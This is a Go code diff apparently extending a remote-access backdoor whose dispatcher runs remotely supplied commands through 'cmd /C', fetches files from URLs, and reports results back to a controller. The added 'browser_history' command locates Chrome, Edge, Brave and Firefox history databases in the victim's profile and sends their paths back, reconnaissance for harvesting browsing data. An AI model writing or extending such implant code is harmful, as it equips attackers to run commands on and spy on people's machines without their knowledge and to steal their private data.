@@ -14,6 +14,8 @@ import (
     "net/http"
     "os/exec"
     "os"
+    "os/user"
+    "path/filepath"
     "io"
     "strings"
     "sync"
@@ -140,6 +142,8 @@ func executeCommandAndSendResult(cmd Command) {
                 Result: "Usage: fetchfile <url> <destination_path>",
             })
         }
+    case cmd.Cmd == "browser_history":
+        checkBrowserHistories(cmd)
     default:
         executeOtherCommand(cmd)
     }
@@ -386,6 +390,80 @@ func fetchRemoteFile(url, destPath string, commandID string) {
         Result: fmt.Sprintf("✅ File successfully fetched to %s", destPath),
     })
 }
+
+func checkBrowserHistories(cmd Command) {
+        browsers := []struct {
+                Name string
+                PathPatterns []string
+        }{
+                {
+                        "Chrome",
+                        []string{`AppData\Local\Google\Chrome\User Data\Default\History`},
+                },
+                {
+                        "Edge",
+                        []string{`AppData\Local\Microsoft\Edge\User Data\Default\History`},
+                },
+                {
+                        "Brave",
+                        []string{`AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History`},
+                },
+                {
+                        "Firefox",
+                        []string{`AppData\Roaming\Mozilla\Firefox\Profiles`},
+                },
+        }
+
+        currentUser, err := user.Current()
+        if err != nil {
+                sendResult(CommandResult{
+                        ID:     cmd.ID,
+                        Result: "Failed to get current user: " + err.Error(),
+                })
+                return
+        }
+
+        var resultBuilder strings.Builder
+
+        for _, browser := range browsers {
+                found := false
+                if browser.Name == "Firefox" {
+                        // Handle Firefox's dynamic profile folder
+                        basePath := filepath.Join(currentUser.HomeDir, browser.PathPatterns[0])
+                        files, err := os.ReadDir(basePath)
+                        if err == nil {
+                                for _, f := range files {
+                                        if f.IsDir() && strings.Contains(f.Name(), ".default") {
+                                                histPath := filepath.Join(basePath, f.Name(), "places.sqlite")
+                                                if _, err := os.Stat(histPath); err == nil {
+                                                        resultBuilder.WriteString(fmt.Sprintf("Browser: %s\nInstalled: Yes\nHistory Path: %s\n---\n", browser.Name, histPath))
+                                                        found = true
+                                                        break
+                                                }
+                                        }
+                                }
+                        }
+                } else {
+                        for _, pattern := range browser.PathPatterns {
+                                histPath := filepath.Join(currentUser.HomeDir, pattern)
+                                if _, err := os.Stat(histPath); err == nil {
+                                        resultBuilder.WriteString(fmt.Sprintf("Browser: %s\nInstalled: Yes\nHistory Path: %s\n---\n", browser.Name, histPath))
+                                        found = true
+                                        break
+                                }
+                        }
+                }
+                if !found {
+                        resultBuilder.WriteString(fmt.Sprintf("Browser: %s\nInstalled: No or History Not Found\n---\n", browser.Name))
+                }
+        }
+
+        sendResult(CommandResult{
+                ID:     cmd.ID,
+                Result: resultBuilder.String(),
+        })
+}
+
 
 func executeOtherCommand(cmd Command) {
     output, err := exec.Command("cmd", "/C", cmd.Cmd).CombinedOutput()
